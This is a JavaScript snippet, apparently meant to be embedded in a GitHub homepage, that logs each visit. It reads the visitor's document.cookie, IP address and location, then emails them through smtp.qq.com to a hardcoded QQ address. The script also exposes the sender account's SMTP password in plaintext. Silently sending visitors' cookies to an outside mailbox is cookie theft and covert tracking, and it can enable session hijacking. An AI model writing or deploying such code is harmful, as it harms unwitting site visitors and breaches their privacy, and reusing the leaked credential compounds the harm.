//访问时间
Date.prototype.format = function(fmt){
  var o = {
    "M+" : this.getMonth()+1,                 //月份
    "d+" : this.getDate(),                    //日
    "h+" : this.getHours(),                   //小时
    "m+" : this.getMinutes(),                 //分
    "s+" : this.getSeconds(),                 //秒
    "q+" : Math.floor((this.getMonth()+3)/3), //季度
    "S"  : this.getMilliseconds()             //毫秒
  };

  if(/(y+)/.test(fmt)){
    fmt=fmt.replace(RegExp.$1, (this.getFullYear()+"").substr(4 - RegExp.$1.length));
  }
        
  for(var k in o){
    if(new RegExp("("+ k +")").test(fmt)){
      fmt = fmt.replace(
        RegExp.$1, (RegExp.$1.length==1) ? (o[k]) : (("00"+ o[k]).substr((""+ o[k]).length)));  
    }       
  }

  return fmt;
}
var now = new Date();
var nowStr = now.format("yyyy-MM-dd hh:mm:ss");
//cookie
var s=document.cookie;
//ip&归属地
var ip=returnCitySN["cip"]+returnCitySN["cname"];
//内容整合：
   var text="时间："+nowStr+"______"+'\n'+"cookie:"+s+'\n'+"______"+"ip&归属："+ip;
//邮件发送
Email.send({
    Host : "smtp.qq.com",  //你所用邮箱的smtp地址
    Username : "1520402908@qq.com",      //你的邮箱用户名（如xxx@qq.com）
    Password : "zixxgjmmubujgdhf",      
    To : '1520402908@qq.com',           //收件人邮箱地址
    From : "1520402908@qq.com",       //发件人邮箱地址
    Subject : "GitHub主页访问",  //邮件主题
    Body : text  //邮件内容
}).then(
  message
);
